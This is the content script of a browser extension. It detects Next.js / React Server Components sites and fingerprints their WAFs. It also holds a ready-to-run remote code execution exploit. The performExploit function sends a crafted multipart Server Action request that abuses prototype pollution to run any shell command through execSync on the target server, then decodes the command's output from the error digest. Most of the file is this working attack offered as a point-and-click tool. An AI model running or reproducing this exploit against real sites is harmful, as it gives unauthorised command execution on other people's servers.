// content.js

// === 1. 被动检测 ===
function performPassiveScan() {
    let score = 0;
    let details = [];
    const html = document.documentElement.outerHTML;

    if (document.contentType === "text/x-component") {
        score += 100;
        details.push("Found: Content-Type text/x-component");
    }
    if (/(window|self)\.__next_f\s*=/.test(html)) {
        score += 80;
        details.push("Found: window.__next_f (App Router)");
    }
    if (html.includes("react-server-dom-webpack")) {
        score += 30;
        details.push("Found: react-server-dom-webpack");
    }
    return { isRSC: score >= 50, details: details };
}

// === 2. 主动指纹 ===
async function performFingerprint() {
    try {
        const res = await fetch(window.location.href, {
            method: 'GET',
            headers: { 'RSC': '1' }
        });
        
        let details = [];
        const cType = res.headers.get('Content-Type') || "";
        const vary = res.headers.get('Vary') || "";
        const text = await res.text();

        if (cType.includes('text/x-component')) details.push("Response Content-Type became text/x-component");
        if (vary.includes('RSC')) details.push("Vary header contains 'RSC'");
        if (/^\d+:["IHL]/.test(text)) details.push("Body structure matches React Flight Protocol");

        return { detected: details.length > 0, details: details };
    } catch (e) {
        return { detected: false, details: ["Network Error"] };
    }
}

// === WAF Detection Logic ===
function detectWAF(headers, bodyText, status) {
    const wafSigs = [
        { name: "Cloudflare", check: () => headers.get('server') === 'cloudflare' || headers.has('cf-ray') || bodyText.includes('Cloudflare') },
        { name: "AWS WAF", check: () => headers.has('x-amzn-trace-id') || (status === 403 && headers.get('server') === 'Awselb/2.0') },
        { name: "Akamai", check: () => headers.get('server') === 'AkamaiGHost' || headers.has('akamai-origin-hop') },
        { name: "Imperva", check: () => headers.has('x-iinfo') || headers.has('x-cdn') || bodyText.includes('Incapsula') },
        { name: "F5 BIG-IP", check: () => headers.has('x-cnection') || (headers.get('server') || '').includes('BigIP') },
        { name: "Nginx Generic", check: () => (headers.get('server') || '').includes('nginx') && (status === 403 || status === 406) }
    ];

    for (const sig of wafSigs) {
        if (sig.check()) return sig.name;
    }
    return null;
}

// === 3. RCE 漏洞利用 ===
async function performExploit(cmd) {
    // 默认命令
    const targetCmd = cmd || "echo vulnerability_test";
    
    // 构造 Payload，动态插入命令
    // Payload 逻辑: execSync('YOUR_CMD').toString().trim()
    const payloadJson = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('${targetCmd}').toString('base64');throw Object.assign(new Error('x'),{digest: res});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;
    const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
    const bodyParts = [
        `--${boundary}`,
        'Content-Disposition: form-data; name="0"',
        '',
        payloadJson,
        `--${boundary}`,
        'Content-Disposition: form-data; name="1"',
        '',
        '"$@0"',
        `--${boundary}`,
        'Content-Disposition: form-data; name="2"',
        '',
        '[]',
        `--${boundary}--`,
        ''
    ].join('\r\n');

    const targetUrl = window.location.href; // Use current URL instead of hardcoded relative path

    try {
        const res = await fetch(targetUrl, {
            method: 'POST',
            headers: {
                'Next-Action': 'x', // Specific header often triggering WAFs
                'X-Nextjs-Request-Id': '7a3f9c1e',
                'Content-Type': `multipart/form-data; boundary=${boundary}`
            },
            body: bodyParts
        });

        const responseText = await res.text();
        const wafName = detectWAF(res.headers, responseText, res.status);

        // 正则提取 digest 的值
        const digestMatch = responseText.match(/"digest"\s*:\s*"((?:[^"\\]|\\.)*)"/);

        if (digestMatch && digestMatch[1]) {
            let rawBase64 = digestMatch[1];
            
            try {
                // 1. 先处理 JSON 字符串转义
                let cleanBase64 = JSON.parse(`"${rawBase64}"`);
                
                // 2. Base64 解码 + 编码自适应
                const normalizeB64 = (b64) => {
                    const padded = b64.replace(/-/g, '+').replace(/_/g, '/');
                    return padded.padEnd(Math.ceil(padded.length / 4) * 4, '=');
                };

                const decodeBytes = (b64) => Uint8Array.from(atob(b64), c => c.charCodeAt(0));

                const safeDecode = (bytes) => {
                    const tryDecode = (enc) => {
                        try { return new TextDecoder(enc).decode(bytes); } catch (e) { return null; }
                    };
                    const utf8 = tryDecode('utf-8');
                    if (utf8 && !utf8.includes('\uFFFD')) return utf8;
                    const gbk = tryDecode('gb18030') || tryDecode('gbk');
                    return gbk || utf8 || '';
                };

                const decodedStr = safeDecode(decodeBytes(normalizeB64(cleanBase64)));

                return { 
                    success: true, 
                    output: decodedStr,
                    waf: wafName
                };
            } catch (parseError) {
                return { 
                    success: false, 
                    msg: "Decoding Error: " + parseError.message, 
                    debug: rawBase64,
                    waf: wafName
                };
            }
        } else {
            return { 
                success: false, 
                msg: "Exploit Failed: 'digest' key not found.",
                debug: responseText.substring(0, 500),
                httpStatus: res.status,
                httpStatusText: res.statusText,
                fullResponse: responseText.length > 2000 ? responseText.substring(0, 2000) + "...[truncated]" : responseText,
                waf: wafName
            };
        }

    } catch (e) {
        return { success: false, msg: "Network/Request Error: " + e.message };
    }
}

// === 消息监听与初始化 ===
const passiveData = performPassiveScan();
if(passiveData.isRSC) chrome.runtime.sendMessage({ action: "update_badge" });

chrome.runtime.onMessage.addListener((req, sender, sendResponse) => {
    if (req.action === "get_passive") sendResponse(passiveData);
    if (req.action === "run_fingerprint") {
        performFingerprint().then(res => sendResponse(res));
        return true;
    }
    if (req.action === "run_exploit") {
        performExploit(req.cmd).then(res => sendResponse(res));
        return true;
    }
});